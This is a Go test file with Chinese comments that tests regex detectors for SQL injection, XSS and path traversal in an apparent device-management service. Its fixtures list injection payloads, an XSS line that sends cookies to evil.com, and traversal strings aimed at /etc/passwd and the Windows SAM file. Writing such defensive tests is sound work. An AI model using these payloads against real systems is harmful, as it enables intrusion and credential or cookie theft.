package security

import (
	"regexp"
	"testing"

	"github.com/stretchr/testify/assert"
)

// ==================== SQL 注入检测 ====================

func TestInputValidation_SQL注入Payload应被过滤(t *testing.T) {
	sqlInjectionPayloads := []string{
		"' OR '1'='1",
		"'; DROP TABLE users; --",
		"1; SELECT * FROM users --",
		"admin'--",
		"' UNION SELECT * FROM users --",
		"1' AND 1=1 --",
		"Robert'); DROP TABLE Students;--",
		"' OR 1=1 --",
		"1' ORDER BY 1--",
	}

	for _, payload := range sqlInjectionPayloads {
		t.Run(payload, func(t *testing.T) {
			// SQL 注入特征检测：包含 SQL 关键字组合
			assert.True(t, containsSQLInjection(payload),
				"应检测到 SQL 注入特征: %s", payload)
		})
	}
}

func TestInputValidation_正常输入不应被误报(t *testing.T) {
	normalInputs := []string{
		"张三",
		"test@example.com",
		"13800138000",
		"CSI-5000-PRO",
		"hello world",
		"user_name",
	}

	for _, input := range normalInputs {
		t.Run(input, func(t *testing.T) {
			assert.False(t, containsSQLInjection(input),
				"正常输入不应被误报为 SQL 注入: %s", input)
		})
	}
}

// containsSQLInjection 检测字符串是否包含常见 SQL 注入特征
func containsSQLInjection(s string) bool {
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)(\b(union|select|insert|update|delete|drop|alter)\b.*\b(from|into|table|set|where)\b)`),
		regexp.MustCompile(`(?i)'\s*(or|and)\s+\d+=\d+`),
		regexp.MustCompile(`(?i)'\s*(or|and)\s+'?\w+'?\s*=\s*'?\w+'?`),
		regexp.MustCompile(`(?i)'\s*--`),
		regexp.MustCompile(`(?i);\s*(drop|select|delete|insert)\b`),
		regexp.MustCompile(`(?i)'\s*;\s*\w+`),
		regexp.MustCompile(`(?i)'\s*(order\s+by)\s+\d+`),
	}
	for _, p := range patterns {
		if p.MatchString(s) {
			return true
		}
	}
	return false
}

// ==================== XSS 检测 ====================

func TestInputValidation_XSSPayload应被检测(t *testing.T) {
	xssPayloads := []string{
		`<script>alert('xss')</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`javascript:alert(1)`,
		`"><script>alert(document.cookie)</script>`,
		`<iframe src="javascript:alert(1)">`,
		`<body onload=alert(1)>`,
		`<img src="x" onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">`,
	}

	for _, payload := range xssPayloads {
		t.Run(payload[:min(len(payload), 30)], func(t *testing.T) {
			assert.True(t, containsXSS(payload),
				"应检测到 XSS 特征: %s", payload)
		})
	}
}

func TestInputValidation_正常HTML不应误报(t *testing.T) {
	normalInputs := []string{
		"Hello World",
		"5000W 逆变器",
		"Temperature > 50°C",
		"a < b && c > d", // 虽然是特殊字符但非 HTML 标签
	}

	for _, input := range normalInputs {
		t.Run(input, func(t *testing.T) {
			assert.False(t, containsXSS(input),
				"正常输入不应被误报为 XSS: %s", input)
		})
	}
}

// containsXSS 检测字符串是否包含常见 XSS 特征
func containsXSS(s string) bool {
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)<script[\s>]`),
		regexp.MustCompile(`(?i)</script>`),
		regexp.MustCompile(`(?i)on\w+\s*=`),
		regexp.MustCompile(`(?i)javascript\s*:`),
		regexp.MustCompile(`(?i)<iframe[\s>]`),
		regexp.MustCompile(`(?i)<svg[\s/>]`),
		regexp.MustCompile(`(?i)<img[^>]+onerror`),
	}
	for _, p := range patterns {
		if p.MatchString(s) {
			return true
		}
	}
	return false
}

// ==================== 路径遍历检测 ====================

func TestInputValidation_路径遍历应被检测(t *testing.T) {
	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"/etc/passwd",
		"....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"/var/log/nginx/access.log",
		"..\\..\\boot.ini",
	}

	for _, payload := range pathTraversalPayloads {
		t.Run(payload[:min(len(payload), 30)], func(t *testing.T) {
			assert.True(t, containsPathTraversal(payload),
				"应检测到路径遍历特征: %s", payload)
		})
	}
}

func TestInputValidation_正常路径不应误报(t *testing.T) {
	normalPaths := []string{
		"/firmware/v2.0.0.bin",
		"/uploads/image.png",
		"CSI-5000",
		"device_data_2024",
	}

	for _, path := range normalPaths {
		t.Run(path, func(t *testing.T) {
			assert.False(t, containsPathTraversal(path),
				"正常路径不应被误报为路径遍历: %s", path)
		})
	}
}

// containsPathTraversal 检测字符串是否包含路径遍历特征
func containsPathTraversal(s string) bool {
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`\.\.[/\\]`),
		regexp.MustCompile(`(?i)%2e%2e[/\\%]`),
		regexp.MustCompile(`(?i)\.\.%2[fF]`),
		regexp.MustCompile(`(?i)^/etc/`),
		regexp.MustCompile(`(?i)^/var/`),
	}
	for _, p := range patterns {
		if p.MatchString(s) {
			return true
		}
	}
	return false
}

// ==================== SN 格式验证（防注入） ====================

func TestInputValidation_SN格式验证(t *testing.T) {
	validSNRegex := regexp.MustCompile(`^[A-Z0-9-]{8,64}$`)

	validSNs := []string{
		"CSI5000PRO",
		"ABC-123-DEF",
		"SN20240101A",
		"DEVICE00001",
	}

	for _, sn := range validSNs {
		t.Run("valid_"+sn, func(t *testing.T) {
			assert.True(t, validSNRegex.MatchString(sn), "SN 应合法: %s", sn)
		})
	}

	invalidSNs := []string{
		"'; DROP TABLE devices;--",      // SQL 注入
		"<script>alert(1)</script>",      // XSS
		"../../../etc/passwd",            // 路径遍历
		"SN\x00injection",                // Null byte 注入
		"AB",                             // 太短
		"lowercase",                      // 小写字母不允许
		"SPACE IN SN",                    // 含空格
		"UNICODE-中文-SN",                // 非 ASCII
	}

	for _, sn := range invalidSNs {
		t.Run("invalid_"+sn[:min(len(sn), 20)], func(t *testing.T) {
			assert.False(t, validSNRegex.MatchString(sn), "SN 应被拒绝: %s", sn)
		})
	}
}

// ==================== 密码策略验证 ====================

func TestInputValidation_密码强度策略(t *testing.T) {
	// 密码策略：最少 6 位，最多 20 位
	testCases := []struct {
		name     string
		password string
		valid    bool
	}{
		{"太短_3位", "abc", false},
		{"太短_5位", "abc12", false},
		{"最短合法_6位", "abc123", true},
		{"正常密码", "MyP@ssw0rd", true},
		{"最长合法_20位", "12345678901234567890", true},
		{"超长_21位", "123456789012345678901", false},
		{"含特殊字符", "p@$$w0rd!#", true},
		{"含空格", "pass word123", true}, // 空格本身不禁止
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			length := len(tc.password)
			valid := length >= 6 && length <= 20
			assert.Equal(t, tc.valid, valid, "密码 '%s' (长度=%d)", tc.password, length)
		})
	}
}

// ==================== 整数溢出检测 ====================

func TestInputValidation_整数溢出防护(t *testing.T) {
	testCases := []struct {
		name  string
		input string
		valid bool
	}{
		{"正常ID", "123", true},
		{"零", "0", true},
		{"负数", "-1", true}, // ParseInt 支持负数
		{"超大数", "99999999999999999999", false},
		{"非数字", "abc", false},
		{"浮点数", "1.5", false},
		{"空字符串", "", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// 模拟 parseID 行为
			valid := isValidInt64(tc.input)
			assert.Equal(t, tc.valid, valid)
		})
	}
}

func isValidInt64(s string) bool {
	if s == "" {
		return false
	}
	// 长度超过 19 位（int64 最大值为 9223372036854775807，19位）
	digits := s
	if len(digits) > 0 && digits[0] == '-' {
		digits = digits[1:]
	}
	if len(digits) > 19 {
		return false
	}
	// 尝试解析为 int64
	var result int64
	for i, c := range s {
		if i == 0 && c == '-' {
			continue
		}
		if c < '0' || c > '9' {
			return false
		}
		result = result*10 + int64(c-'0')
		if result > 9223372036854775807 {
			return false
		}
	}
	return true
}

// ==================== JSON 注入防护 ====================

func TestInputValidation_超大JSONBody应被限制(t *testing.T) {
	// API 应限制请求体大小（当前配置 MaxMultipartMemory=200MB）
	// 但 JSON body 应有更严格的限制
	maxRecommendedSize := 10 * 1024 * 1024 // 10MB for JSON body

	testCases := []struct {
		name string
		size int
		ok   bool
	}{
		{"正常 1KB", 1024, true},
		{"正常 100KB", 100 * 1024, true},
		{"正常 1MB", 1024 * 1024, true},
		{"超大 50MB", 50 * 1024 * 1024, false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.ok, tc.size <= maxRecommendedSize,
				"JSON body 大小 %d bytes 应被限制", tc.size)
		})
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
